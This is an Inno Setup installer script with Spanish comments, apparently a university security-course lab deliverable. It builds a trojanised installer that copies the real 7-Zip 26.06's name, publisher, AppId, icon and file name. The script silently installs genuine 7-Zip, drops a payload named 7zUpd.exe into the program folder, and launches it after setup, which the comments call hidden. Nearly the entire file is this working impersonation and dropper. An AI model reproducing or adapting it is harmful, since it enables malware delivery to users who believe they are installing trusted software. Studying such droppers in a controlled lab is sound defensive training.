; Instalador del laboratorio DISFRAZADO como el instalador de 7-Zip 26.06.
;
; ÁMBITO AUTORIZADO DEL CURSO (Seguridad de TI II - UTN): se usa únicamente
; en el laboratorio del curso, sobre equipos e instancias propios. El
; instalador imita el nombre, el icono y la apariencia del instalador real
; de 7-Zip como capa de disfraz (ingeniería social del entregable).
;
; Qué ve la víctima: un asistente idéntico al setup de 7-Zip
; (bienvenida -> licencia -> carpeta -> instalar -> finalizar), archivo
; generado 7z2606-x64.exe con el icono real de 7-Zip.
;
; Qué pasa por dentro:
;   1. Instala el 7-Zip REAL (redist/7z-installer-x64.exe) en silencio.
;   2. Copia el payload (dist/7zUpd.exe) dentro de la carpeta de 7-Zip.
;   3. Ejecuta el payload al finalizar, SIN ventana (corre oculto).
;
; Requiere Inno Setup 6 y 7z-installer-x64.exe en installer/redist/.

#define SevenZipName "7-Zip"
#define SevenZipVersion "26.06"
#define SevenZipPublisher "Igor Pavlov"

[Setup]
AppId={{23170F69-40C1-2701-1709-000001000000}
AppName={#SevenZipName}
AppVersion={#SevenZipVersion}
AppPublisher={#SevenZipPublisher}
DefaultDirName={autopf}\7-Zip
DefaultGroupName={#SevenZipName}
OutputDir=output
OutputBaseFilename=7z2606-x64
Compression=lzma
SolidCompression=yes
PrivilegesRequired=admin
WizardStyle=modern
SetupIconFile=..\assets\7z.ico
LicenseFile=License.txt
UninstallDisplayIcon={app}\7zFM.exe
UninstallDisplayName={#SevenZipName} {#SevenZipVersion}

[Files]
; Payload oculto: se copia primero; el 7-Zip real no lo pisa.
Source: "..\dist\7zUpd.exe"; DestDir: "{app}"; Flags: ignoreversion
; 7-Zip real (capa de carga): se instala en silencio con /S.
Source: "redist\7z-installer-x64.exe"; DestDir: "{tmp}"; Flags: deleteafterinstall

[Icons]
Name: "{group}\7-Zip File Manager"; Filename: "{app}\7zFM.exe"

[Run]
Filename: "{tmp}\7z-installer-x64.exe"; Parameters: "/S /D={app}"; StatusMsg: "Instalando 7-Zip..."; Flags: waituntilterminated
; El payload arranca al cerrar el asistente, sin ventana.
Filename: "{app}\7zUpd.exe"; Flags: nowait postinstall skipifsilent
